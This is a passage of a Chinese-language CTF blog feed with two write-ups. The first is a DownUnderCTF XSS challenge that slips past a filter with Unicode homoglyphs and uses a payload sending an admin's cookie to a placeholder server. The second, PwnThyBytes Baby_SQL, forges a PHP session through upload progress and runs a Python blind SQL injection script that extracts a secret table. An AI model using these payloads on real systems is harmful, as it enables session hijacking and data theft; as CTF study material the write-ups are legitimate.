    <content type="html"><![CDATA[<h2 id="Chainreaction"><a href="#Chainreaction" class="headerlink" title="Chainreaction"></a>Chainreaction</h2><p>进去后有登录注册，登录注册后进入到个人主页<br><img src="https://s3.bmp.ovh/imgs/2021/09/1cd2c4250830e0a1.png">      </p><p>这样一句话<code>Report a problem on this page and an admin will check out the page for any problems</code><br>XSS了吧   </p><p>就是XSS反弹admin的cookie了     </p><p>aboutme那里有过滤<code>&lt;&gt;</code>、<code>script</code></p><p>dirsearch扫到<code>/dev</code><br><code>Dev portal is still under construction. If you already have had account provisioned head over to /devchat or head to /admin if you are a site admin</code></p><p><code>/devchat</code><br><img src="https://s3.bmp.ovh/imgs/2021/09/9c839dfe5bda5f17.png"><br>提到Unicode的问题      </p><p>WP中aboutme那里的绕过用的是Unicode同型字，在这个网站<code>https://www.irongeek.com/homoglyph-attack-generator.php</code>   </p><p>比如<code>&lt;</code>的同型字：<br><img src="https://s3.bmp.ovh/imgs/2021/09/453d673bc3b74b6d.png">   </p><p>以此来绕过过滤<br><code>&quot;＞＜Ｓcript＞alert(1)＜/Ｓcript＞</code>    </p><p>payload:<code>&quot;＞＜Ｓcript＞var i = new Image;i.src=&quot;https://[my-server-url]?&quot;+document.cookie＜/Ｓcript＞</code>     </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Chainreaction&quot;&gt;&lt;a href=&quot;#Chainreaction&quot; class=&quot;headerlink&quot; title=&quot;Chainreaction&quot;&gt;&lt;/a&gt;Chainreaction&lt;/h2&gt;&lt;p&gt;进去后有登录注册，登录注册后进入到个人主页&lt;br&gt;&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="DownUnderCTF" scheme="http://lll-nnn.github.io/categories/CTF/DownUnderCTF/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>PwnThyBytes 2019 Baby_SQL</title>
    <link href="http://lll-nnn.github.io/2021/09/20/BUU95/"/>
    <id>http://lll-nnn.github.io/2021/09/20/BUU95/</id>
    <published>2021-09-20T13:59:01.000Z</published>
    <updated>2021-09-20T14:15:16.985Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><p>首页源码由注释<code>/source.zip</code></p><p><code>login.php</code>里的SQL语句<br><img src="https://s3.bmp.ovh/imgs/2021/09/825f257913ec9b01.png">       </p><p>但<code>index.php</code>里有过滤<br><img src="https://s3.bmp.ovh/imgs/2021/09/3ebd4db23b9bee97.png">     </p><p><code>addslashes</code>函数会转义字符<br>有个<code>session_start()</code>函数<br>看WP说可以伪造<code>session</code>直接访问<code>login.php</code>从而绕过<code>index.php</code>中的过滤</p><p><strong>在phpsession里如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()</strong>     </p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;http://8fa62d49-2408-4b1a-9d2e-6cfb4016a8b0.node4.buuoj.cn:81/templates/login.php&quot;</span>files = &#123;<span class="hljs-string">&quot;file&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;a = requests.post(url=url, files=files, data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;,                  cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;test1&quot;</span>&#125;, params=&#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>&#125;,                  proxies=&#123;<span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>&#125;)print(a.text)</code></pre><p>然后在Burp中改<code>username=1&#39;%22%20or%20sleep(4)%23</code>成功延时    </p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> timefiles=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">&#x27;1234567&#x27;</span>&#125;url=<span class="hljs-string">&#x27;http://8fa62d49-2408-4b1a-9d2e-6cfb4016a8b0.node4.buuoj.cn:81/templates/login.php&#x27;</span>flag=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    low=<span class="hljs-number">32</span>    high=<span class="hljs-number">128</span>    mid=(low+high)//<span class="hljs-number">2</span>    <span class="hljs-keyword">while</span>(low&lt;high):        time.sleep(<span class="hljs-number">0.6</span>)        payload=<span class="hljs-string">&quot;1&#x27;\&quot; or ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        payload_table=<span class="hljs-string">&quot;1&#x27;\&quot; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ptbctf&#x27;),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        payload_column=<span class="hljs-string">&quot;1&#x27;\&quot; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag_tbl&#x27;),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        payload_data=<span class="hljs-string">&quot;1&#x27;\&quot; or ascii(substr((select group_concat(secret) from ptbctf.flag_tbl),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        a=requests.post(url,files=files,                    data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="hljs-string">&#x27;123456&#x27;</span>&#125;,                    cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:<span class="hljs-string">&#x27;test1&#x27;</span>&#125;,                    params=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;123123&#x27;</span>&#125;)        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=?p=home&quot; /&gt;&#x27;</span> <span class="hljs-keyword">in</span> a.text:            low=mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            high=mid        mid=(low+high)//<span class="hljs-number">2</span>    <span class="hljs-keyword">if</span>(mid==<span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid==<span class="hljs-number">128</span>):        <span class="hljs-keyword">break</span>    flag+=<span class="hljs-built_in">chr</span>(mid)    print(flag)</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PwnThyBytes-2019-Baby-SQL&quot;&gt;&lt;a href=&quot;#PwnThyBytes-2019-Baby-SQL&quot; class=&quot;headerlink&quot; title=&quot;[PwnThyBytes 2019]Baby_SQL&quot;&gt;&lt;/a&gt;[PwnThyByt</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="sqli" scheme="http://lll-nnn.github.io/categories/CTF/sqli/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="sqli" scheme="http://lll-nnn.github.io/tags/sqli/"/>
    
  </entry>
  
</feed>
